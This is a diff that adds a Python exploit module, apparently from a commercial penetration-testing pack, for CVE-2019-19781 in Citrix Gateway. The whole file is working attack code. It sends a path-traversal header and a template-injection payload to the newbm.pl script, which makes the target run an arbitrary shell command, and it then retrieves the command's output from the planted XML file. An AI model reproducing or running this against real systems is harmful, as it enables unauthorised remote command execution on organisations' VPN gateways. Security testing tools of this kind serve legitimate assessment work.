@@ -1,0 +1,135 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+import sys
+import time
+import os
+import random
+import base64
+import io
+import zipfile
+import re
+import urllib
+import json
+import uuid
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Citrix Gateway Remote Command Execution Vulnerability"
+
+DESCRIPTION = "Remote command execution vulnerability in Citrix Gateway"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Citrix"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["Date public"] = "2019.12.17"
+DOCUMENTATION["References"] = "https://support.citrix.com/article/CTX267027"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2019-19781" 
+DOCUMENTATION["CVE Url"] = "https://nvd.nist.gov/vuln/detail/CVE-2019-19781"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.cmd = "id"        
+    self.basepath = "/"    
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 0
+    self.name = NAME
+    return
+	            
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)     
+    self.cmd = self.argsDict.get("cmd", self.cmd)
+
+  def run(self):
+    self.getargs()
+    
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+
+    xmlfile = str(uuid.uuid4()).split('-')[0]     
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
+    ua.addHeader("NSC_USER", "../../../../netscaler/portal/templates/"+xmlfile) 
+    ua.addHeader("NSC_NONCE", "citrix")
+    
+    url = "/vpn/../vpns/portal/scripts/newbm.pl"
+    params = urllib.urlencode({"url": "http://citrix.com", "desc": "[% template.new('BLOCK'='print `"+self.cmd+"`')%]", "title": "citrix"})                                  
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)   
+    data,code = ua.POST(mainurl, params, return_response_code=True)
+    
+    if (not code == 200) and ('parent.window.ns_reload()' in data):
+        self.log('[D2] Target not vulnerable')                    
+        return 0
+    
+    url = "/vpn/../vpns/portal/"+xmlfile+".xml"                            
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)                	   	
+    ua.addHeader("NSC_USER", "citrix") 
+    data = ua.GET(mainurl)     
+    buff = re.sub('^&#.*&#10;$', '', data, flags=re.MULTILINE)
+    
+    self.log('[D2] Output:\n%s'%buff.strip())        
+            
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return 1
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
